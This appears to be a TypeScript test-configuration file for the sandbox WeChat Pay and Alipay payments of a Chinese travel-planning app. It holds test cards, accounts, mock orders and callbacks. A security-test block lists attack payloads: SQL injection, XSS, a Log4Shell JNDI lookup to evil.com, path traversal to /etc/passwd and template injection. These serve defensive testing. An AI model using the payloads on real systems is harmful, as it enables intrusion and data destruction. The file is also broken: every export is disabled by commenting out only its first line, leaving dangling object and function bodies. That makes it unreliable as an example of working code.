
// ============================================================================
// TODO: 支付功能临时禁用
// 原因: 依赖问题导致支付模块无法正常工作
// 计划: 在第二阶段重新启用并完善支付功能
// 影响: 不影响旅游规划等核心功能的正常使用
// ============================================================================

/**
 * 支付测试环境配置
 * 支持微信支付和支付宝的沙盒测试环境
 * 包含隔离式支付验证架构的测试配置
 */

export interface PaymentTestConfig {
  wechatPay: WeChatPayTestConfig;
  alipay: AlipayTestConfig;
  testMode: boolean;
  mockPayments: boolean;
  callbackBaseUrl: string;
  testUsers: TestUser[];
  testOrders: TestOrder[];
}

export interface WeChatPayTestConfig {
  appId: string;
  mchId: string;
  apiKey: string;
  certPath?: string;
  keyPath?: string;
  sandboxMode: boolean;
  testApiUrl: string;
  callbackUrl: string;
  returnUrl: string;
  testCards: TestCard[];
}

export interface AlipayTestConfig {
  appId: string;
  merchantId: string;
  privateKey: string;
  publicKey: string;
  alipayPublicKey: string;
  sandboxMode: boolean;
  testApiUrl: string;
  callbackUrl: string;
  returnUrl: string;
  testAccounts: TestAccount[];
}

export interface TestUser {
  id: string;
  email: string;
  phone: string;
  nickname: string;
  password: string;
  preferences: any;
}

export interface TestOrder {
  id: string;
  userId: string;
  amount: number;
  title: string;
  description: string;
  businessData: any;
}

export interface TestCard {
  cardNumber: string;
  cardType: string;
  description: string;
  expectedResult: 'SUCCESS' | 'FAILURE';
}

export interface TestAccount {
  account: string;
  password: string;
  accountType: string;
  description: string;
  expectedResult: 'SUCCESS' | 'FAILURE';
}

/**
 * 支付测试环境配置
 */
// export const paymentTestConfig // 临时禁用支付功能: PaymentTestConfig = {
  testMode: true,
  mockPayments: process.env.MOCK_PAYMENTS === 'true',
  callbackBaseUrl: process.env.CALLBACK_BASE_URL || 'http://localhost:3000',

  // 微信支付测试配置
  wechatPay: {
    appId: process.env.WECHAT_TEST_APP_ID || 'wx_test_app_id',
    mchId: process.env.WECHAT_TEST_MCH_ID || 'test_mch_id',
    apiKey: process.env.WECHAT_TEST_API_KEY || 'test_api_key_32_characters_long',
    sandboxMode: true,
    testApiUrl: 'https://api.mch.weixin.qq.com/sandboxnew',
    callbackUrl: `${process.env.CALLBACK_BASE_URL || 'http://localhost:3000'}/api/v1/payments/wechat/callback`,
    returnUrl: `${process.env.CALLBACK_BASE_URL || 'http://localhost:3000'}/payment/success`,
    
    // 微信支付测试卡号
    testCards: [
      {
        cardNumber: '4000000000000002',
        cardType: 'VISA',
        description: '测试成功卡号',
        expectedResult: 'SUCCESS'
      },
      {
        cardNumber: '4000000000000010',
        cardType: 'VISA',
        description: '测试失败卡号',
        expectedResult: 'FAILURE'
      },
      {
        cardNumber: '4000000000000028',
        cardType: 'VISA',
        description: '测试超时卡号',
        expectedResult: 'FAILURE'
      }
    ]
  },

  // 支付宝测试配置
  alipay: {
    appId: process.env.ALIPAY_TEST_APP_ID || 'test_app_id',
    merchantId: process.env.ALIPAY_TEST_MERCHANT_ID || 'test_merchant_id',
    privateKey: process.env.ALIPAY_TEST_PRIVATE_KEY || 'test_private_key',
    publicKey: process.env.ALIPAY_TEST_PUBLIC_KEY || 'test_public_key',
    alipayPublicKey: process.env.ALIPAY_TEST_ALIPAY_PUBLIC_KEY || 'alipay_public_key',
    sandboxMode: true,
    testApiUrl: 'https://openapi.alipaydev.com/gateway.do',
    callbackUrl: `${process.env.CALLBACK_BASE_URL || 'http://localhost:3000'}/api/v1/payments/alipay/callback`,
    returnUrl: `${process.env.CALLBACK_BASE_URL || 'http://localhost:3000'}/payment/success`,
    
    // 支付宝测试账号
    testAccounts: [
      {
        account: 'test@alipay.com',
        password: 'test123',
        accountType: 'EMAIL',
        description: '测试成功账号',
        expectedResult: 'SUCCESS'
      },
      {
        account: '13800000001',
        password: 'test123',
        accountType: 'PHONE',
        description: '测试成功手机号',
        expectedResult: 'SUCCESS'
      },
      {
        account: 'fail@alipay.com',
        password: 'fail123',
        accountType: 'EMAIL',
        description: '测试失败账号',
        expectedResult: 'FAILURE'
      }
    ]
  },

  // 测试用户数据
  testUsers: [
    {
      id: 'test-user-001',
      email: 'test@smarttravel.com',
      phone: '13800138001',
      nickname: '测试用户1',
      password: 'test123456',
      preferences: {
        travelStyle: 'comfort',
        transportModes: ['driving', 'walking'],
        interests: ['景点', '美食'],
        language: 'zh-CN'
      }
    },
    {
      id: 'test-user-002',
      email: 'demo@smarttravel.com',
      phone: '13800138002',
      nickname: '演示用户',
      password: 'demo123456',
      preferences: {
        travelStyle: 'budget',
        transportModes: ['transit', 'walking'],
        interests: ['历史', '文化'],
        language: 'zh-CN'
      }
    }
  ],

  // 测试订单数据
  testOrders: [
    {
      id: 'test-order-001',
      userId: 'test-user-001',
      amount: 9900, // 99元
      title: '北京三日游规划',
      description: '包含故宫、长城、颐和园的三日游行程规划',
      businessData: {
        travelPlan: {
          destination: '北京',
          duration: 3,
          attractions: ['故宫', '长城', '颐和园'],
          budget: 1000
        }
      }
    },
    {
      id: 'test-order-002',
      userId: 'test-user-002',
      amount: 4900, // 49元
      title: '杭州一日游规划',
      description: '西湖周边一日游行程规划',
      businessData: {
        travelPlan: {
          destination: '杭州',
          duration: 1,
          attractions: ['西湖', '雷峰塔'],
          budget: 500
        }
      }
    }
  ]
};

/**
 * 支付模拟器配置
 */
export interface PaymentMockConfig {
  enabled: boolean;
  successRate: number; // 成功率 0-1
  responseDelay: number; // 响应延迟(毫秒)
  scenarios: PaymentScenario[];
}

export interface PaymentScenario {
  name: string;
  condition: (amount: number, provider: string) => boolean;
  result: 'SUCCESS' | 'FAILURE' | 'TIMEOUT';
  delay: number;
  errorCode?: string;
  errorMessage?: string;
}

// export const paymentMockConfig // 临时禁用支付功能: PaymentMockConfig = {
  enabled: process.env.MOCK_PAYMENTS === 'true',
  successRate: 0.95, // 95%成功率
  responseDelay: 2000, // 2秒延迟

  scenarios: [
    {
      name: '小额支付成功',
      condition: (amount, provider) => amount < 10000, // 小于100元
      result: 'SUCCESS',
      delay: 1000
    },
    {
      name: '大额支付需要验证',
      condition: (amount, provider) => amount >= 50000, // 大于500元
      result: 'SUCCESS',
      delay: 5000
    },
    {
      name: '特定金额测试失败',
      condition: (amount, provider) => amount === 1, // 1分钱测试失败
      result: 'FAILURE',
      delay: 1000,
      errorCode: 'INSUFFICIENT_FUNDS',
      errorMessage: '余额不足'
    },
    {
      name: '网络超时测试',
      condition: (amount, provider) => amount === 2, // 2分钱测试超时
      result: 'TIMEOUT',
      delay: 30000,
      errorCode: 'NETWORK_TIMEOUT',
      errorMessage: '网络超时'
    }
  ]
};

/**
 * 支付回调测试配置
 */
export interface CallbackTestConfig {
  enableMockCallbacks: boolean;
  callbackDelay: number;
  callbackRetries: number;
  testSignatures: boolean;
  mockCallbackData: MockCallbackData[];
}

export interface MockCallbackData {
  provider: 'wechat' | 'alipay';
  orderId: string;
  transactionId: string;
  amount: number;
  status: string;
  callbackData: any;
  signature: string;
  isValid: boolean;
}

// export const callbackTestConfig // 临时禁用支付功能: CallbackTestConfig = {
  enableMockCallbacks: process.env.MOCK_CALLBACKS === 'true',
  callbackDelay: 3000, // 3秒后发送回调
  callbackRetries: 3,
  testSignatures: true,

  mockCallbackData: [
    {
      provider: 'wechat',
      orderId: 'test-order-001',
      transactionId: 'wx_test_trans_001',
      amount: 9900,
      status: 'SUCCESS',
      callbackData: {
        appid: 'wx_test_app_id',
        mch_id: 'test_mch_id',
        out_trade_no: 'test-order-001',
        transaction_id: 'wx_test_trans_001',
        trade_state: 'SUCCESS',
        total_fee: '9900',
        time_end: '20250106120000'
      },
      signature: 'test_signature_001',
      isValid: true
    },
    {
      provider: 'alipay',
      orderId: 'test-order-002',
      transactionId: 'alipay_test_trans_001',
      amount: 4900,
      status: 'TRADE_SUCCESS',
      callbackData: {
        app_id: 'test_app_id',
        out_trade_no: 'test-order-002',
        trade_no: 'alipay_test_trans_001',
        trade_status: 'TRADE_SUCCESS',
        total_amount: '49.00',
        gmt_payment: '2025-01-06 12:00:00'
      },
      signature: 'test_signature_002',
      isValid: true
    }
  ]
};

/**
 * 安全测试配置
 */
export interface SecurityTestConfig {
  enableSecurityTests: boolean;
  testSqlInjection: boolean;
  testXssAttacks: boolean;
  testReplayAttacks: boolean;
  testSignatureForgery: boolean;
  maliciousPayloads: string[];
}

// export const securityTestConfig // 临时禁用支付功能: SecurityTestConfig = {
  enableSecurityTests: process.env.ENABLE_SECURITY_TESTS === 'true',
  testSqlInjection: true,
  testXssAttacks: true,
  testReplayAttacks: true,
  testSignatureForgery: true,

  maliciousPayloads: [
    "'; DROP TABLE users; --",
    '<script>alert("XSS")</script>',
    '${jndi:ldap://evil.com/a}',
    '../../../etc/passwd',
    'javascript:alert(1)',
    '{{7*7}}',
    '${7*7}',
    '<%=7*7%>',
    '#{7*7}'
  ]
};

/**
 * 获取当前环境的支付测试配置
 */
// export function getPaymentTestConfig // 临时禁用支付功能(): PaymentTestConfig {
  return paymentTestConfig;
}

/**
 * 获取支付模拟器配置
 */
// export function getPaymentMockConfig // 临时禁用支付功能(): PaymentMockConfig {
  return paymentMockConfig;
}

/**
 * 获取回调测试配置
 */
// export function getCallbackTestConfig // 临时禁用支付功能(): CallbackTestConfig {
  return callbackTestConfig;
}

/**
 * 获取安全测试配置
 */
// export function getSecurityTestConfig // 临时禁用支付功能(): SecurityTestConfig {
  return securityTestConfig;
}

/**
 * 验证测试环境配置
 */
// export function validateTestConfig // 临时禁用支付功能(): void {
  if (!paymentTestConfig.callbackBaseUrl) {
    throw new Error('Callback base URL is required for payment testing');
  }

  if (!paymentTestConfig.wechatPay.appId || !paymentTestConfig.wechatPay.mchId) {
    throw new Error('WeChat Pay test configuration is incomplete');
  }

  if (!paymentTestConfig.alipay.appId || !paymentTestConfig.alipay.merchantId) {
    throw new Error('Alipay test configuration is incomplete');
  }

  console.log('✅ 支付测试环境配置验证通过');
}

/**
 * 初始化测试环境
 */
export async function initializeTestEnvironment(): Promise<void> {
  console.log('🚀 初始化支付测试环境...');
  
  // 验证配置
  validateTestConfig();
  
  // 设置测试环境变量
  process.env.NODE_ENV = 'test';
  process.env.PAYMENT_TEST_MODE = 'true';
  
  console.log('✅ 支付测试环境初始化完成');
}

export default {
  paymentTestConfig,
  paymentMockConfig,
  callbackTestConfig,
  securityTestConfig,
  getPaymentTestConfig,
  getPaymentMockConfig,
  getCallbackTestConfig,
  getSecurityTestConfig,
  validateTestConfig,
  initializeTestEnvironment
};
